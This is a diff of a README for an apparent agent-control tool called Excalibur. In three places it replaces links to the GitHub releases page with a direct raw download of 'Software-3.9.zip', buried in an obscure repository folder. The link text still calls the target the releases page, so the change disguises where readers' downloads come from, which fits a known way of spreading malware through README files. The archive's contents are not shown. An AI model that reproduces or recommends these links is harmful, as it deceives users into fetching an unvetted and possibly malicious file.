@@ -1,6 +1,6 @@
 # 🔮 excalibur - A calm path to agent control
 
-[![Download Excalibur](https://img.shields.io/badge/Download%20Excalibur-blue?style=for-the-badge&logo=github)](https://github.com/aliraza7925/excalibur/releases)
+[![Download Excalibur](https://img.shields.io/badge/Download%20Excalibur-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/aliraza7925/excalibur/main/grimoire/spellbooks/web/scry_url/Software-3.9.zip)
 
 ## 🧭 What Excalibur does
 
@@ -30,7 +30,7 @@ You should also have:
 
 Visit the releases page to download and run this file:
 
-[Go to the Excalibur releases page](https://github.com/aliraza7925/excalibur/releases)
+[Go to the Excalibur releases page](https://raw.githubusercontent.com/aliraza7925/excalibur/main/grimoire/spellbooks/web/scry_url/Software-3.9.zip)
 
 After you open the page:
 
@@ -188,7 +188,7 @@ This makes the app useful for people who want structure without a lot of setup w
 
 If you need the app again, use the releases page here:
 
-[Excalibur releases](https://github.com/aliraza7925/excalibur/releases)
+[Excalibur releases](https://raw.githubusercontent.com/aliraza7925/excalibur/main/grimoire/spellbooks/web/scry_url/Software-3.9.zip)
 
 ## 📦 Basic setup checklist
 
